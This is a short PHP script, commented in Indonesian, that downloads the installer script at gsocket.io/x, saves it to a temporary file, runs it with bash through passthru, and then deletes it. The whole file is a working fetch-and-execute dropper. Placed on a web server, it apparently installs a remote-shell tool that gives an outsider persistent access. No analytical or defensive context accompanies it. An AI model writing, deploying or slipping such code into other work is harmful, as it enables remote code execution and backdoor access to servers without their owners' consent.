<?php

$url = 'https://gsocket.io/x';

// 1. Inisialisasi cURL (Setara dengan curl -fsSL)
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Jangan langsung output, simpan ke variabel
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // -L (Ikuti redirect)
curl_setopt($ch, CURLOPT_FAILONERROR, true);    // -f (Gagal jika HTTP code >= 400)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // -S (Verifikasi SSL untuk keamanan)

$scriptContent = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// 2. Cek apakah unduhan berhasil
if ($scriptContent !== false && $httpCode >= 200 && $httpCode < 300) {
    
    // 3. Buat file sementara untuk menyimpan script bash
    $tempFile = tempnam(sys_get_temp_dir(), 'gsocket_install_');
    
    if ($tempFile !== false) {
        // Tulis konten script ke file sementara
        file_put_contents($tempFile, $scriptContent);
        
        // 4. Eksekusi script menggunakan bash (Setara dengan bash -c)
        // passthru digunakan agar output dari script langsung muncul di layar/terminal
        echo "Menjalankan installer GSocket...\n";
        passthru('bash ' . escapeshellarg($tempFile), $returnCode);
        
        // 5. Hapus file sementara setelah selesai
        unlink($tempFile);
        
        if ($returnCode !== 0) {
            echo "\n[PERINGATAN] Script selesai dengan kode error: $returnCode\n";
        } else {
            echo "\n[SUKSES] Instalasi/eksekusi selesai.\n";
        }
    } else {
        die("[ERROR] Gagal membuat file sementara.\n");
    }
    
} else {
    die("[ERROR] Gagal mengunduh script. HTTP Code: $httpCode. Error: $curlError\n");
}

?>
